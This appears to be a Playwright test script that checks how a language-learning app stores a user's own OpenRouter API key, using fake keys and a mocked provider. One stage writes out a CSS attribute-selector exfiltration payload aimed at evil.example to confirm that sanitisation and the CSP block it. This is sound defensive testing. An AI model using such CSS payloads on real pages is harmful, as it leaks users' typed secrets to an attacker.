// A key of your own for the in-app AI (ai/own-key.js, practice/inapp-run.js), end to end on a LOCAL server, on a phone
// screen in Chrome for Testing. OpenRouter is a stand-in played by this script (Playwright's routing answers
// https://openrouter.ai), and the key is a FAKE one typed by the check: no real key, no real provider, nothing spent.
// What it holds:
//   - Connect with OpenRouter (PKCE: the code traded for a key only with the verifier its challenge came from) and a pasted key;
//   - the key kept sealed: not in IndexedDB as text, not in localStorage, sessionStorage or the page, its sealing key not extractable;
//   - a practice run here on it: the AI opening, a turn graded on your line, the end with a summary; every request to the
//     provider carrying the key, ZDR and no data collection, and nothing of the account;
//   - the key never in any request to this server (every URL, header and body read; a planted leak must be caught);
//   - the CSP letting the page reach only the listed provider, and a hostile look reaching nothing;
//   - Forget, and signing out taking every key off the device;
// With --off (a server started without OWN_KEY_ENABLED): nothing of it shows, and the server refuses it.
//
//   python3 pipelines/lyric-video/tools/gpu.py run --who <session> --label "own key check" --kind parallel -- \
//     node 08-lexicommons/app/scripts/own-key-check.mjs http://localhost:<port> <outDir> [--off]
// LOCAL only: it makes and deletes its own account.

import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { chromium } from "./quiet-browser.mjs";

const [BASE, outArg = "own-key-check-out", ...flags] = process.argv.slice(2);
const OFF = flags.includes("--off");
if (!BASE || !/^http:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(BASE)) {
  console.error("own-key-check makes and deletes an account: give it a local server, e.g. http://localhost:8811");
  process.exit(2);
}
const OUT = resolve(outArg);
mkdirSync(join(OUT, "shots"), { recursive: true });

// The fake keys: never real, and long enough to search for anywhere.
const PASTED = `sk-or-v1-check${randomBytes(24).toString("hex")}`;
const FROM_OAUTH = `sk-or-v1-oauth${randomBytes(24).toString("hex")}`;
const NAME = "Own Key Check";

const results = [];
const problems = [];
let page;
async function stage(name, fn) {
  const started = Date.now();
  try {
    const detail = await fn();
    results.push({ stage: name, ok: true, ms: Date.now() - started, detail });
    console.log(`ok    ${name}${detail ? `: ${typeof detail === "string" ? detail : JSON.stringify(detail)}` : ""}`);
  } catch (error) {
    results.push({ stage: name, ok: false, ms: Date.now() - started, error: String(error?.message ?? error) });
    console.log(`FAIL  ${name}: ${error?.message ?? error}`);
    await page?.screenshot({ path: join(OUT, "shots", `FAIL-${results.length}.png`) }).catch(() => {});
  }
}
const assert = (condition, message) => {
  if (!condition) throw new Error(message);
};
const shot = (name) => page.screenshot({ path: join(OUT, "shots", `${name}.png`) });
const until = async (fn, arg, timeout = 15_000) => {
  const end = Date.now() + timeout;
  for (;;) {
    const value = await page.evaluate(fn, arg);
    if (value) return value;
    if (Date.now() > end) throw new Error(`waited ${timeout} ms: ${fn.toString().slice(0, 120)}`);
    await page.waitForTimeout(100);
  }
};

// ---------- the stand-in OpenRouter ----------

const provider = { chats: [], keyChecks: 0, exchanges: [], challenge: null, limit: null };
const sse = (obj, usage = { prompt_tokens: 4000, completion_tokens: 200, cost: 0.0007 }) => {
  const text = JSON.stringify(obj);
  const pieces = [text.slice(0, 40), text.slice(40, 120), text.slice(120)].filter(Boolean);
  return [
    ": OPENROUTER PROCESSING",
    "",
    ...pieces.flatMap((piece, i) => [`data: ${JSON.stringify({ id: "gen-check", model: "openai/gpt-6-luna", choices: [{ delta: { content: piece }, finish_reason: i === pieces.length - 1 ? "stop" : null }] })}`, ""]),
    `data: ${JSON.stringify({ id: "gen-check", choices: [], usage })}`,
    "",
    "data: [DONE]",
    "",
  ].join("\n");
};
const OPENING = { say: [{ nl: "Hoi! Wat heb je gisteren gedaan?", literal: ["Hi!", "What", "have", "you", "*yesterday*", "*done*"], en: "Hi! What did you do yesterday?", words: { gisteren: "gisteren", gedaan: "doen" } }], expect: "either" };
const GRADED = {
  grades: [{ verdict: "fixed", better: "Gisteren ben ik naar de winkel gegaan.", marks: [{ said: "Gisteren ik ben", fix: "Gisteren ben ik" }], concepts: [{ concept: "p:v2", outcome: "wrong", note: "After gisteren the verb comes next." }], note: "Start with a time word and the verb jumps ahead of ik." }],
  say: [{ nl: "Wat heb je daar gekocht?", literal: ["What", "have", "you", "*there*", "*bought*"], en: "What did you buy there?", words: { gekocht: "kopen" } }],
  expect: "either",
};
const SUMMARY = { text: "Goed gedaan! You talked about yesterday and fixed the verb's place.", went_well: ["the perfect tense"], work_on: ["the verb second after a time word"], new_words: [{ nl: "de winkel", en: "the shop" }] };

async function openrouter(route) {
  const request = route.request();
  const url = new URL(request.url());
  const auth = request.headers().authorization ?? "";
  if (url.pathname === "/auth") {
    provider.challenge = url.searchParams.get("code_challenge");
    const back = new URL(url.searchParams.get("callback_url"));
    back.searchParams.set("code", "check-code-1");
    return route.fulfill({ status: 302, headers: { Location: back.toString() } });
  }
  const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization, content-type, x-title", "Access-Control-Allow-Methods": "GET, POST, OPTIONS" };
  if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  if (url.pathname === "/api/v1/auth/keys") {
    const body = JSON.parse(request.postData() ?? "{}");
    provider.exchanges.push(body);
    const ok = body.code === "check-code-1" && body.code_challenge_method === "S256" && createHash("sha256").update(body.code_verifier ?? "").digest("base64url") === provider.challenge;
    return route.fulfill({ status: ok ? 200 : 403, headers: { ...cors, "Content-Type": "application/json" }, body: JSON.stringify(ok ? { key: FROM_OAUTH } : { error: { message: "bad verifier" } }) });
  }
  if (url.pathname === "/api/v1/key") {
    provider.keyChecks++;
    const known = auth === `Bearer ${PASTED}` || auth === `Bearer ${FROM_OAUTH}`;
    return route.fulfill({ status: known ? 200 : 401, headers: { ...cors, "Content-Type": "application/json" }, body: JSON.stringify(known ? { data: { limit: provider.limit, limit_remaining: provider.limit === null ? null : provider.limit - 0.25, usage_monthly: 0.25 } } : { error: { message: "No auth credentials found" } }) });
  }
  if (url.pathname === "/api/v1/chat/completions") {
    const body = JSON.parse(request.postData() ?? "{}");
    provider.chats.push({ auth, body, headers: request.headers() });
    const last = body.messages?.at(-1)?.content ?? "";
    const reply = /"end":/.test(last) ? SUMMARY : /Gisteren ik ben/.test(last) ? GRADED : OPENING;
    return route.fulfill({ status: 200, headers: { ...cors, "Content-Type": "text/event-stream" }, body: sse(reply) });
  }
  return route.fulfill({ status: 404, headers: cors, body: "not in the stand-in" });
}

// ---------- the browser ----------

const browser = await chromium.launch({ headless: true, channel: "chrome", args: ["--mute-audio"] });
const context = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2 });
await context.route("https://openrouter.ai/**", openrouter);
// Anywhere else outside: refused, and noted (nothing here should ever ask).
const outside = [];
await context.route(/^https?:\/\/(?!localhost|127\.0\.0\.1|openrouter\.ai)/, (route) => (outside.push(route.request().url()), route.abort()));
page = await context.newPage();
// The stand-in's refusals in the controls (a wrong verifier, a key it doesn't know) show as failed loads: expected there only.
let expectRefusals = false;
page.on("console", (m) => m.type() === "error" && !/Content Security Policy|ERR_FAILED|api\.example\.com|evil\.example/.test(m.text()) && !(expectRefusals && /status of 40[134]/.test(m.text())) && problems.push(`console: ${m.text()}`));
page.on("pageerror", (e) => problems.push(`page error: ${e.message}`));
// Which addresses answered with an error, so a console line saying only "status of 401" can be traced.
const failedLoads = [];
page.on("response", (r) => r.status() >= 400 && failedLoads.push(`${r.status()} ${r.request().method()} ${r.url().replace(BASE, "")}`));
// Every request to this server, as it went: URL, headers and body.
const ours = [];
page.on("request", (r) => {
  if (r.url().startsWith(BASE)) ours.push({ url: r.url(), headers: JSON.stringify(r.headers()), body: r.postData() ?? "" });
});
const cdp = await context.newCDPSession(page);
await cdp.send("WebAuthn.enable");
await cdp.send("WebAuthn.addVirtualAuthenticator", { options: { protocol: "ctap2", transport: "internal", hasResidentKey: true, hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true } });

/** Requests to this server carrying any of these strings. */
const leaks = (requests, secrets) => requests.filter((r) => secrets.some((s) => r.url.includes(s) || r.headers.includes(s) || r.body.includes(s)));

/** Everything this origin keeps in the browser that could hold the key as text: IndexedDB's records, both storages, the page. */
const READ_BROWSER = async () => {
  const out = { idb: [], local: JSON.stringify({ ...localStorage }), session: JSON.stringify({ ...sessionStorage }), page: document.documentElement.outerHTML, sealExtractable: null, dbs: [] };
  out.dbs = (await indexedDB.databases()).map((d) => d.name);
  if (!out.dbs.includes("lx-own-key")) return out;
  const db = await new Promise((resolve, reject) => {
    const r = indexedDB.open("lx-own-key");
    r.onsuccess = () => resolve(r.result);
    r.onerror = () => reject(r.error);
  });
  const rows = await new Promise((resolve) => {
    const tx = db.transaction("keys", "readonly");
    const store = tx.objectStore("keys");
    const all = [];
    store.openCursor().onsuccess = (e) => {
      const cursor = e.target.result;
      if (!cursor) return resolve(all);
      all.push({ key: cursor.key, value: cursor.value });
      cursor.continue();
    };
  });
  db.close();
  const asText = (v) => {
    if (v instanceof CryptoKey) return `[CryptoKey ${v.extractable}]`;
    if (v instanceof ArrayBuffer || ArrayBuffer.isView(v)) return new TextDecoder("latin1").decode(v instanceof ArrayBuffer ? v : v.buffer);
    if (v && typeof v === "object") return Object.entries(v).map(([k, x]) => `${k}=${asText(x)}`).join(";");
    return String(v);
  };
  for (const row of rows) {
    if (row.value instanceof CryptoKey) out.sealExtractable = row.value.extractable;
    out.idb.push(`${row.key}:${asText(row.value)}`);
  }
  return out;
};

// ---------- the run ----------

await stage("sign up with a passkey; the site says what it offers", async () => {
  await page.goto(`${BASE}/app/`);
  await page.waitForURL(/\/login\?next=/);
  await page.click("summary");
  await page.fill('input[name="name"]', NAME);
  await page.click('#register button[type="submit"]');
  await page.waitForURL(`${BASE}/app/`, { timeout: 20_000 });
  await page.waitForSelector("html[data-app-ready]");
  const features = await page.evaluate(async () => (await (await fetch("/api/me")).json()).features);
  assert(features && features.ownKey === !OFF, `features ${JSON.stringify(features)}`);
  return `features ${JSON.stringify(features)}`;
});

if (OFF) {
  await stage("off: the Connection page has no key, and the server refuses a practice on one", async () => {
    await page.goto(`${BASE}/app/#ai/connect`);
    await page.locator('[data-part="page-title"]', { hasText: "Your AI" }).waitFor();
    await page.waitForTimeout(1500);
    assert(!(await page.getByText("Your own key").count()), "no key group");
    expectRefusals = true;
    const start = await page.evaluate(async () => (await fetch("/api/practice", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ kind: "conversation", answer: "both", minutes: 10, language: "nl", inapp: { engine: "own-key", name: "x" } }) })).status);
    const reply = await page.evaluate(async () => (await fetch("/api/practice/abc/reply", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })).status);
    assert(start === 404 && reply === 404, `start ${start}, reply ${reply}`);
    await page.waitForTimeout(300);
    expectRefusals = false;
    // A key saved anyway (by script, as nothing on the page offers it) changes nothing here: Practice still waits for an AI.
    await page.evaluate(async () => {
      const own = await import("/js/ai/own-key.js");
      const me = await (await fetch("/api/me")).json();
      await own.saveKey(me.user.id, { key: "sk-or-v1-offcheckkeyabcdefghijklmnop" });
      await own.checkKeyPresence(me);
    });
    await page.goto(`${BASE}/app/#practice/new/conversation`);
    await page.getByText("Optional. Everything in Lexicommons works without it.").waitFor();
    assert(!(await page.getByText("Who you'll practice with").count()), "no choice of who");
    return "nothing shows; 404 for both; a key saved anyway opens nothing";
  });
} else {
  await stage("the Connection page offers Connect with OpenRouter; with no key and no AI, Practice is the section's own page", async () => {
    await page.goto(`${BASE}/app/#ai/connect`);
    await page.getByText("Your own key").waitFor();
    await page.getByRole("button", { name: "Connect with OpenRouter" }).waitFor();
    await shot("01-connect");
    await page.goto(`${BASE}/app/#practice/new/conversation`);
    await page.getByText("Optional. Everything in Lexicommons works without it.").waitFor();
    assert(!(await page.getByRole("button", { name: "Start" }).count()), "no Start without an AI or a key");
    return "offered; Practice waits for one";
  });

  await stage("Connect with OpenRouter: the code is traded with its verifier, and the key kept for this account", async () => {
    await page.goto(`${BASE}/app/#ai/connect`);
    await page.getByRole("button", { name: "Connect with OpenRouter" }).click();
    await page.waitForURL(`${BASE}/app/#ai/connect`, { timeout: 15_000 });
    await page.getByText("ends " + FROM_OAUTH.slice(-4)).waitFor();
    assert(provider.exchanges.length === 1 && provider.exchanges[0].code === "check-code-1", "one exchange");
    assert(!(await page.evaluate(() => location.search.includes("code"))), "the code left the address");
    await page.getByText("This key has no spending limit").waitFor();
    await shot("02-connected");
    return "connected; the no-limit line shown";
  });

  await stage("a verifier that doesn't match its challenge gets no key (control)", async () => {
    expectRefusals = true;
    const status = await page.evaluate(async () => (await fetch("https://openrouter.ai/api/v1/auth/keys", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ code: "check-code-1", code_verifier: "not-the-one", code_challenge_method: "S256" }) })).status);
    assert(status === 403, `stand-in answered ${status}`);
    return "refused";
  });

  await stage("Forget, then a pasted key with a limit: checked with the provider first, the field emptied", async () => {
    await page.getByRole("button", { name: "Forget this key" }).click();
    await page.getByRole("button", { name: "Connect with OpenRouter" }).waitFor();
    provider.limit = 5;
    await page.getByText("Or paste a key").click();
    const field = page.locator('input[aria-label="Your OpenRouter key"]');
    await field.fill(PASTED);
    await page.getByRole("button", { name: "Save" }).click();
    await page.getByText("ends " + PASTED.slice(-4)).waitFor();
    await page.getByText("Spending limit $5, $4.75 left.").waitFor();
    assert(provider.keyChecks >= 2, `checked ${provider.keyChecks}`);
    const bad = await page.evaluate(async () => {
      const own = await import("/js/ai/own-key.js");
      const me = await (await fetch("/api/me")).json();
      try {
        await own.savePastedKey(me.user.id, { key: "sk-or-v1-notarealkeyatallforthestandin00" });
        return "saved";
      } catch (e) {
        return e.message;
      }
    });
    assert(/doesn't accept/.test(bad), `an unknown key: ${bad}`);
    await page.waitForTimeout(300);
    expectRefusals = false;
    return "pasted, limit read; an unknown key refused";
  });

  await stage("the key is sealed: not in IndexedDB as text, not in either storage or the page; its sealing key can't be taken", async () => {
    const seen = await page.evaluate(READ_BROWSER);
    assert(seen.dbs.includes("lx-own-key") && seen.idb.length === 2, `records: ${seen.idb.length}`);
    for (const [where, text] of [["IndexedDB", seen.idb.join("\n")], ["localStorage", seen.local], ["sessionStorage", seen.session], ["the page", seen.page]]) {
      assert(!text.includes(PASTED) && !text.includes(PASTED.slice(10, 40)), `the key in ${where}`);
    }
    assert(seen.sealExtractable === false, `sealing key extractable: ${seen.sealExtractable}`);
    // Control: the same reading finds what's there in plain text (the last four, shown on purpose).
    assert(seen.idb.join("\n").includes(PASTED.slice(-4)), "the reader sees the record");
    return "sealed";
  });

  let practiceId = null;
  await stage("a practice run here on the key: the choice, the AI opening, every request with ZDR and nothing of the account", async () => {
    await page.goto(`${BASE}/app/#practice/new/conversation`);
    await page.getByText("Who you'll practice with").waitFor();
    await shot("03-setup");
    await page.getByRole("button", { name: "Start" }).click();
    await page.locator(".lx-practice-room:not([data-ghost])").waitFor();
    await page.locator('[data-part="chat-event"]', { hasText: "GPT-6 Luna joined" }).waitFor();
    await page.locator('[data-part="chat-line"][data-variant="ai"]', { hasText: "Wat heb je gisteren gedaan?" }).first().waitFor({ timeout: 20_000 });
    practiceId = await page.evaluate(async () => (await (await fetch("/api/practice")).json()).find((p) => p.state !== "ended")?.id);
    const chat = provider.chats[0];
    assert(chat.auth === `Bearer ${PASTED}`, "the key went to the provider");
    assert(chat.headers.cookie === undefined && chat.headers.referer === undefined, "no cookie, no referrer");
    const body = chat.body;
    assert(body.provider?.zdr === true && body.provider?.data_collection === "deny" && body.provider?.require_parameters === true, `routing ${JSON.stringify(body.provider)}`);
    assert(body.stream === true && body.response_format?.type === "json_schema" && body.model === "openai/gpt-6-luna" && body.reasoning?.effort === "low", "stream, schema, model");
    const sent = JSON.stringify(body);
    const me = await page.evaluate(async () => (await (await fetch("/api/me")).json()).user.id);
    assert(!sent.includes(NAME) && !sent.includes(me), "nothing of the account");
    assert(/Practicing with someone in Lexicommons/.test(sent) && !/practice_wait/.test(sent), "the in-app guide");
    await shot("04-opened");
    return `practice ${practiceId}; ${provider.chats.length} request`;
  });

  await stage("a typed turn is graded on your line, and becomes evidence", async () => {
    const box = page.locator('.lx-practice-room [data-part="composer"] input').first();
    await box.fill("Gisteren ik ben naar de winkel gegaan");
    await box.press("Enter");
    const mine = page.locator('[data-part="chat-line"][data-state="graded"]').first();
    await mine.waitFor({ timeout: 20_000 });
    await page.locator('[data-part="chat-line"][data-variant="ai"]', { hasText: "Wat heb je daar gekocht?" }).first().waitFor();
    const last = provider.chats.at(-1).body.messages.at(-1).content;
    assert(/Gisteren ik ben naar de winkel gegaan/.test(last), "the turn reached the provider");
    const evidence = await until(async () => {
      const progress = await import("/js/study/progress.js");
      return progress.allEvidence().some((row) => row.concept === "p:v2" && row.outcome === "wrong");
    });
    assert(evidence, "p:v2 wrong recorded");
    await shot("05-graded");
    return "graded; p:v2 wrong";
  });

  await stage("End: the summary comes from the provider and is saved on this device", async () => {
    await page.locator(".lx-practice-room:not([data-ghost])").getByRole("button", { name: "End", exact: true }).click();
    await page.locator('[data-part="session-summary"]').waitFor({ timeout: 20_000 });
    await page.getByText("You talked about yesterday").waitFor();
    assert(/"end":/.test(provider.chats.at(-1).body.messages.at(-1).content), "the summary was asked for");
    await shot("06-summary");
    return `${provider.chats.length} requests in all`;
  });

  await stage("the key never reached this server, in any URL, header or body (a planted leak is caught)", async () => {
    const found = leaks(ours, [PASTED, FROM_OAUTH]);
    assert(!found.length, `leaked in ${found.map((r) => r.url).join(", ")}`);
    const control = leaks([...ours, { url: `${BASE}/api/x`, headers: "{}", body: `{"k":"${PASTED}"}` }], [PASTED]);
    assert(control.length === 1, "the planted leak was found");
    assert(!outside.length, `asked elsewhere: ${outside.join(", ")}`);
    return `${ours.length} requests read`;
  });

  await stage("the CSP lets the page reach only the listed provider", async () => {
    const tried = await page.evaluate(async () => {
      const blocked = [];
      document.addEventListener("securitypolicyviolation", (e) => blocked.push(e.blockedURI));
      let other = "sent";
      try {
        await fetch("https://api.example.com/v1/chat/completions", { method: "POST", body: "{}" });
      } catch {
        other = "refused";
      }
      await new Promise((r) => setTimeout(r, 300));
      return { other, blocked };
    });
    assert(tried.other === "refused" && tried.blocked.some((u) => u.includes("api.example.com")), JSON.stringify(tried));
    return "api.example.com refused by the CSP";
  });

  await stage("a hostile look reaches nothing: its outside links are taken out, and the key field never holds the key as an attribute", async () => {
    await page.getByRole("button", { name: "Forget this key" }).click({ timeout: 2000 }).catch(() => {});
    await page.goto(`${BASE}/app/#ai/connect`);
    await page.getByText("Your own key").waitFor();
    if (await page.getByRole("button", { name: "Forget this key" }).count()) await page.getByRole("button", { name: "Forget this key" }).click();
    await page.getByText("Or paste a key").click();
    const css = 'input[type="password"][value^="s"] { background-image: url(https://evil.example/s); } input { background: url("https://evil.example/any"); }';
    const look = await page.evaluate(async (css) => {
      const theme = await import("/js/lx/theme.js");
      await theme.applyRemoteLook({ base: "graphite", tokens: {}, css, images: {} }, "check");
      return theme.currentLook().css;
    }, css);
    assert(!look.includes("evil.example"), "the safety check took the links out");
    // And past the safety check: the raw rules in the page, with the key typed.
    const blocked = await page.evaluate(async (css) => {
      const seen = [];
      document.addEventListener("securitypolicyviolation", (e) => seen.push(e.blockedURI));
      const sheet = new CSSStyleSheet();
      sheet.replaceSync(css);
      document.adoptedStyleSheets = [...document.adoptedStyleSheets, sheet];
      const field = document.querySelector('input[aria-label="Your OpenRouter key"]');
      field.focus();
      document.execCommand("insertText", false, "sk-or-v1-typed");
      await new Promise((r) => setTimeout(r, 500));
      const attr = field.getAttribute("value");
      // Control: with the value written as an attribute, the rule matches and the CSP is what stops it.
      field.setAttribute("value", "sk-or");
      await new Promise((r) => setTimeout(r, 500));
      field.removeAttribute("value");
      return { attr, seen };
    }, css);
    assert(blocked.attr === null, "the typed key is no attribute");
    assert(blocked.seen.every((u) => u.includes("evil.example")) && blocked.seen.length >= 1, `only the control's request, blocked: ${JSON.stringify(blocked.seen)}`);
    assert(!outside.some((u) => u.includes("evil.example")), "nothing reached evil.example");
    await page.evaluate(async () => (await import("/js/lx/theme.js")).applyRemoteLook({ base: "graphite", tokens: {}, css: "", images: {} }, "check"));
    return `${blocked.seen.length} blocked by the CSP (the control), none sent`;
  });

  await stage("signing out takes every key off the device", async () => {
    await page.evaluate(async (key) => {
      const own = await import("/js/ai/own-key.js");
      const me = await (await fetch("/api/me")).json();
      await own.saveKey(me.user.id, { key });
    }, PASTED);
    await page.goto(`${BASE}/app/#settings/account`);
    await page.locator('[data-part="list-row"]', { hasText: "Sign out" }).click();
    await page.waitForURL(/\/login/, { timeout: 15_000 });
    const dbs = await page.evaluate(async () => (await indexedDB.databases()).map((d) => d.name));
    assert(!dbs.includes("lx-own-key"), `still there: ${dbs}`);
    await page.click("#signin");
    await page.waitForURL(`${BASE}/app/`, { timeout: 20_000 });
    return "gone; signed back in";
  });
}

await stage("no console errors", async () => {
  assert(!problems.length, `${problems.slice(0, 5).join(" | ")} (failed loads: ${failedLoads.join(", ")})`);
  return "none";
});

await stage("delete the test account", async () => {
  const status = await page.evaluate(async () => (await fetch("/api/me", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ confirm: "delete my account" }) })).status);
  assert(status === 200, `delete ${status}`);
  return "deleted";
});

await browser.close();
const failed = results.filter((r) => !r.ok);
writeFileSync(join(OUT, "results.json"), JSON.stringify({ base: BASE, off: OFF, at: new Date().toISOString(), passed: results.length - failed.length, failed: failed.length, results, problems, providerRequests: provider.chats.length }, null, 2));
console.log(`\n${results.length - failed.length}/${results.length} passed`);
process.exit(failed.length ? 1 : 0);
